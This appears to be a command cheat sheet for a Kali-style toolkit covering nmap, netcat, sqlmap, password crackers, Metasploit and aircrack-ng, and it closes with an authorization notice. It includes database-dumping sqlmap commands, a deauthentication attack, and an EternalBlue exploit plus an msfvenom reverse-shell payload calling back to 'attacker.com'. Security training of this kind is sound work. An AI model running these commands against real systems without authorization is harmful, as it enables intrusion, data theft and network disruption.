# Ghost Kali - Complete Tools Documentation

## Table of Contents
1. [Reconnaissance Tools](#reconnaissance-tools)
2. [Network Scanning](#network-scanning)
3. [Web Application Testing](#web-application-testing)
4. [Password Cracking](#password-cracking)
5. [Exploitation Framework](#exploitation-framework)
6. [Wireless Security](#wireless-security)
7. [Additional Tools](#additional-tools)

---

## Reconnaissance Tools

### Whois
**Purpose:** Domain and IP information gathering

```bash
whois example.com
whois 8.8.8.8
```

### DNS Tools
**Purpose:** DNS enumeration and resolution

```bash
nslookup example.com
dig example.com
host example.com
```

### Curl & Wget
**Purpose:** Data transfer and file downloading

```bash
curl -I https://example.com  # Get headers
curl -v https://example.com  # Verbose output
wget https://example.com/file.zip
```

---

## Network Scanning

### Nmap
**Purpose:** Network reconnaissance and security auditing

```bash
# Basic scan
nmap target.com

# Service version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Aggressive scan (all options)
nmap -A target.com

# TCP/UDP scan
nmap -sS target.com       # TCP SYN scan
nmap -sU target.com       # UDP scan

# Port specification
nmap -p 1-1000 target.com
nmap -p 22,80,443 target.com
nmap -p- target.com       # All ports

# Output options
nmap -oN output.txt target.com      # Normal output
nmap -oX output.xml target.com      # XML output
nmap -oG output.grep target.com     # Grepable output
```

### Netcat
**Purpose:** Network utility for reading/writing network connections

```bash
# Connect to a host
nc -nv target.com 80

# Listen on a port
nc -lnvp 4444

# Send data
echo "GET /" | nc target.com 80

# Port scanning
nc -zv target.com 1-100
```

### TCPdump
**Purpose:** Network packet analysis

```bash
# Capture traffic on all interfaces
tcpdump -i any

# Capture on specific interface
tcpdump -i eth0

# Save to file
tcpdump -i eth0 -w capture.pcap

# Filter by protocol
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp

# Filter by port
tcpdump -i eth0 port 80
```

---

## Web Application Testing

### SQLMap
**Purpose:** SQL injection detection and exploitation

```bash
# Basic SQL injection scan
python3 $HOME/sqlmap/sqlmap.py -u "http://target.com/page?id=1"

# Dump databases
python3 $HOME/sqlmap/sqlmap.py -u "http://target.com/page?id=1" --dbs

# Dump tables
python3 $HOME/sqlmap/sqlmap.py -u "http://target.com/page?id=1" -D database_name --tables

# Dump data
python3 $HOME/sqlmap/sqlmap.py -u "http://target.com/page?id=1" -D database_name -T table_name --dump

# POST request
python3 $HOME/sqlmap/sqlmap.py -u "http://target.com/login" --method=POST -d "username=admin&password=pass"

# Custom headers
python3 $HOME/sqlmap/sqlmap.py -u "http://target.com/page?id=1" -H "Cookie: session=abc123"

# Aggressive options
python3 $HOME/sqlmap/sqlmap.py -u "http://target.com/page?id=1" --batch --level=5 --risk=3
```

### Web Reconnaissance
**Purpose:** Website information gathering

```bash
# Get HTTP headers
curl -I https://example.com

# Verbose connection info
curl -v https://example.com

# Extract links and forms
curl https://example.com | grep -E 'href=|action='

# SSL/TLS certificate info
openssl s_client -connect example.com:443
```

---

## Password Cracking

### John the Ripper
**Purpose:** Offline password cracking

```bash
# Basic cracking
john --format=md5 hashes.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Specific hash format
john --format=sha512 hashes.txt

# Brute force
john --incremental hashes.txt

# Single crack mode
john --single hashes.txt
```

### Hashcat
**Purpose:** GPU-accelerated password cracking

```bash
# MD5 cracking with wordlist
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Hash types:
# -m 0    MD5
# -m 1    MD5 (MD5($pass.$salt))
# -m 100  SHA1
# -m 1400 SHA2-256
# -m 1700 SHA2-512

# Attack modes:
# -a 0    Dictionary/Wordlist
# -a 1    Combination
# -a 3    Brute force

# Examples
hashcat -m 1400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1700 -a 3 hashes.txt ?a?a?a?a  # 4-char brute force
```

---

## Exploitation Framework

### Metasploit Framework
**Purpose:** Penetration testing and exploit development

```bash
# Start Metasploit
$HOME/metasploit-framework/msfconsole

# Inside Metasploit console
> search cve-2021-1234
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOST target.com
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST attacker.com
> run

# Generate payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f exe -o payload.exe
```

---

## Wireless Security

### Aircrack-ng
**Purpose:** Wireless security auditing

```bash
# Monitor mode
airmon-ng start wlan0

# Packet capture
airodump-ng wlan0mon

# Crack WPA2
aircrack-ng -w wordlist.txt capture.cap

# Deauthentication
aireplay-ng -0 0 -a [BSSID] wlan0mon
```

### Wireshark
**Purpose:** Network packet analyzer and visualization

```bash
# Start GUI
wireshark

# Command line
tshark -i eth0 -w capture.pcap

# Filter packets
tshark -i eth0 -f "port 80"
```

---

## Additional Tools

### Net-tools
```bash
ifconfig         # Network configuration
netstat -tunap   # Network statistics
route -n         # Routing table
arp -a           # ARP table
```

### System Utilities
```bash
ps aux           # Process listing
top              # Real-time processes
ss -tunap        # Socket statistics
lsof             # List open files
```

---

## Quick Reference Commands

```bash
# Network information
ifconfig
ip addr show
netstat -tunap

# DNS queries
nslookup domain.com
dig domain.com
host domain.com

# Port scanning
nmap -A target.com
nmap -sV -p- target.com

# Web testing
curl -v https://target.com
sqlmap -u "http://target.com/page?id=1" --dbs

# Password cracking
john hashfile.txt
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Packet capture
tcpdump -i eth0 -w capture.pcap
tshark -i eth0 -w capture.pcap
```

---

## Disclaimer

⚠️ **LEGAL NOTICE**
These tools are powerful and can be used for both legitimate and malicious purposes. Always:
- Obtain written permission before conducting security tests
- Only test systems you own or have explicit authorization to test
- Comply with all applicable laws and regulations
- Use responsibly and ethically

Unauthorized access to computer systems is ILLEGAL.

---

## Additional Resources

- [Nmap Documentation](https://nmap.org/)
- [SQLMap Guide](http://sqlmap.org/)
- [Metasploit Project](https://www.metasploit.com/)
- [John the Ripper](https://www.openwall.com/john/)
- [Hashcat](https://hashcat.net/)
- [OWASP Testing Guide](https://owasp.org/)
